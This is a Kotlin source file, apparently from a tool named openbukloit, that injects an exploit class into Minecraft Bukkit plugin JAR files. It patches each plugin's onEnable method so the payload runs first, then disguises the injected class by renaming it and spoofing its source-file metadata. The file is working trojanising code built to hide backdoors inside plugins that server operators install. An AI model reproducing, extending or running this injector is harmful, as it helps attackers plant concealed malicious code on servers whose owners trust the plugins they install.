package injector

import cli.Logs
import com.github.ajalt.mordant.rendering.TextColors.brightCyan
import com.rikonardo.cafebabe.ClassFile
import com.rikonardo.cafebabe.data.constantpool.*
import com.rikonardo.cafebabe.data.numbers.BinaryInt
import javassist.ClassPool
import org.yaml.snakeyaml.Yaml
import utils.*
import java.io.File
import java.lang.management.ManagementFactory
import java.nio.file.*
import kotlin.io.path.*

fun process(
    input: Path,
    output: Path,
    exploit: ClassFile,
    replace: Boolean,
    noCamouflage: Boolean,
    className: String?,
    methodName: String?
) {
    Logs.task("Processing ${input.name}")
    if (!replace && Files.exists(output)) {
        Logs.finish().warn("Skipped plugin because output file already exists")
        return
    }
    val tempJar = File("./.openbukloit/temp/current.jar")
    val patchedDir = File("./.openbukloit/temp/patched")

    try {
        if (tempJar.exists()) tempJar.delete()
        Files.copy(input, tempJar.toPath(), StandardCopyOption.REPLACE_EXISTING)

        val camouflage = if (noCamouflage)
            Camouflage(className?.replace(".", "/") ?: exploit.name, methodName ?: "inject")
        else
            calculateCamouflage(tempJar)

        var fileSystem: FileSystem? = null
        try {
            fileSystem = FileSystems.newFileSystem(tempJar.toPath(), null)

            val pluginData: Map<String, Any> = Yaml().load(fileSystem.getPath("/plugin.yml").inputStream())
            val pluginName = if (pluginData.containsKey("name")) pluginData["name"] as String
            else throw Exception("No name found in plugin.yml")
            val pluginMainClass = if (pluginData.containsKey("main")) pluginData["main"] as String
            else throw Exception("No main class found in plugin.yml")
            val pluginMainClassFile = pluginMainClass.replace(".", "/") + ".class"

            Logs.info("Plugin name: ${brightCyan(pluginName)}")
            Logs.info("Plugin main class: ${brightCyan(pluginMainClass)}")

            val mainClass = ClassFile(fileSystem.getPath("/$pluginMainClassFile").inputStream().readBytes())
            Logs.info(
                "Main class version: ${
                    brightCyan(mainClass.version.toString())
                } (Java ${
                    brightCyan(getJavaVersion(mainClass.version.major, mainClass.version.minor))
                })"
            )

            Logs.info("Injecting exploit template...")
            val originalExploitName = exploit.name
            val tempExploitName = makeRandomLowerCaseString(20)
            val tempExploitMethodName = makeRandomLowerCaseString(20)
            exploit.name = tempExploitName
            val exploitMethod = exploit.findInjectMethod()
            exploitMethod.name = tempExploitMethodName

            fileSystem.getPath("$tempExploitName.class").writeBytes(exploit.compile())
            fileSystem = fileSystem.commit(tempJar.toPath())

            Logs.info("Patching main class...")
            patchedDir.mkdirs()
            
            // Note: m.insertBefore ensures the exploit runs even if the original plugin crashes later.
            runInjectOnJRE(
                toJRE(requireJDK(mainClass.version.major, mainClass.version.minor)),
                pluginMainClass,
                "onEnable",
                "{ $tempExploitName.$tempExploitMethodName(this); }",
                "./.openbukloit/temp/patched",
            )

            Logs.info("Injecting patched main class...")
            Files.copy(
                Paths.get("./.openbukloit/temp/patched/$pluginMainClassFile"),
                fileSystem.getPath("/$pluginMainClassFile"),
                StandardCopyOption.REPLACE_EXISTING
            )

            if (noCamouflage) Logs.info("Renaming exploit class...")
            else Logs.info("Applying camouflage...")

            applyCamouflage(
                fileSystem,
                pluginMainClassFile,
                exploit,
                exploitMethod,
                originalExploitName,
                camouflage,
                tempExploitName
            )

        } finally {
            fileSystem?.close()
        }
        Files.copy(tempJar.toPath(), output, StandardCopyOption.REPLACE_EXISTING)
        Logs.finish().info("${input.name} patched successfully")
    } finally {
        if (tempJar.exists()) tempJar.delete()
        if (patchedDir.exists()) patchedDir.deleteRecursively()
    }
}

private fun applyCamouflage(
    fileSystem: FileSystem,
    pluginMainClassFile: String,
    exploit: ClassFile,
    exploitMethod: com.rikonardo.cafebabe.Method,
    originalExploitName: String,
    camouflage: Camouflage,
    tempExploitName: String
) {
    val patchedMainClass = ClassFile(fileSystem.getPath("/$pluginMainClassFile").inputStream().readBytes())
    
    // Rename references in the main plugin class
    for (entry in patchedMainClass.constantPool.entries) {
        when (entry) {
            is ConstantClass -> {
                val nameConst = patchedMainClass.constantPool[entry.nameIndex] as ConstantUtf8
                if (nameConst.value == exploit.name) nameConst.value = camouflage.className
            }
            is ConstantMethodref -> {
                val nameTypeConst = patchedMainClass.constantPool[entry.nameAndTypeIndex] as ConstantNameAndType
                val nameConst = patchedMainClass.constantPool[nameTypeConst.nameIndex] as ConstantUtf8
                if (nameConst.value == exploitMethod.name) nameConst.value = camouflage.methodName
            }
        }
    }
    fileSystem.getPath("/$pluginMainClassFile").writeBytes(patchedMainClass.compile(), StandardOpenOption.TRUNCATE_EXISTING)

    exploit.name = camouflage.className
    exploitMethod.name = camouflage.methodName

    // Fix: Robust L-descriptor replacement for Lambdas/InvokeDynamic (Java 11+)
    for (entry in exploit.constantPool.entries) {
        when (entry) {
            is ConstantInvokeDynamic -> {
                val nameTypeConst = exploit.constantPool[entry.nameAndTypeIndex] as ConstantNameAndType
                val descriptorConst = exploit.constantPool[nameTypeConst.descriptorIndex] as ConstantUtf8
                if (descriptorConst.value.contains("L$originalExploitName;")) {
                    descriptorConst.value = descriptorConst.value.replace("L$originalExploitName;", "L${camouflage.className};")
                }
            }
            is ConstantMethodType -> {
                val descriptorConst = exploit.constantPool[entry.descriptorIndex] as ConstantUtf8
                if (descriptorConst.value.contains("L$originalExploitName;")) {
                    descriptorConst.value = descriptorConst.value.replace("L$originalExploitName;", "L${camouflage.className};")
                }
            }
        }
    }

    // Update SourceFile attribute
    for (attr in exploit.attributes) {
        if (attr.name == "SourceFile") {
            val index = BinaryInt.from(attr.info).value
            val sourceFileConst = exploit.constantPool[index] as ConstantUtf8
            sourceFileConst.value = camouflage.className.substringAfterLast("/") + ".java"
        }
    }

    // Cleanup temp class and write final camouflaged class
    val tempPath = fileSystem.getPath("$tempExploitName.class")
    if (Files.exists(tempPath)) Files.delete(tempPath)

    val finalPath = fileSystem.getPath("${camouflage.className}.class")
    if (camouflage.className.contains("/")) {
        val dir = finalPath.parent
        if (dir != null && !Files.exists(dir)) Files.createDirectories(dir)
    }
    finalPath.writeBytes(exploit.compile(), StandardOpenOption.CREATE, StandardOpenOption.TRUNCATE_EXISTING)
}

fun runInjectOnJRE(
    jvm: Path,
    clazz: String,
    method: String,
    insert: String,
    saveTo: String
) {
    val process = ProcessBuilder(
        jvm.toFile().canonicalPath,
        "-cp",
        getClassPathArg(ManagementFactory.getRuntimeMXBean().classPath),
        "InjectMainKt",
        clazz,
        method,
        insert,
        saveTo
    ).start()
    process.errorStream.bufferedReader().use { bufferedReader ->
        bufferedReader.lines().forEach { Logs.error(it) }
    }

    process.waitFor()
    val result = process.exitValue()
    if (result != 0) throw Exception("Injection task failed with code: $result")
}

fun injectFunc(clazz: String, method: String, insert: String, saveTo: String) {
    val pool = ClassPool(ClassPool.getDefault())
    pool.appendClassPath("./.openbukloit/temp/current.jar")
    val cc = pool.get(clazz)
    try {
        val m = cc.getDeclaredMethod(method)
        // Use insertBefore to ensure the payload triggers at the very start of plugin enabling
        m.insertBefore(insert)
    } catch (e: javassist.NotFoundException) {
        // If onEnable is missing, create it and ensure it calls super just in case
        val newMethod = javassist.CtNewMethod.make(
            "public void $method() { try { super.$method(); } catch (Exception e) {} $insert }",
            cc
        )
        cc.addMethod(newMethod)
    }
    cc.writeFile(saveTo)
}

fun FileSystem.commit(path: Path): FileSystem {
    this.close()
    return FileSystems.newFileSystem(path, null)
}
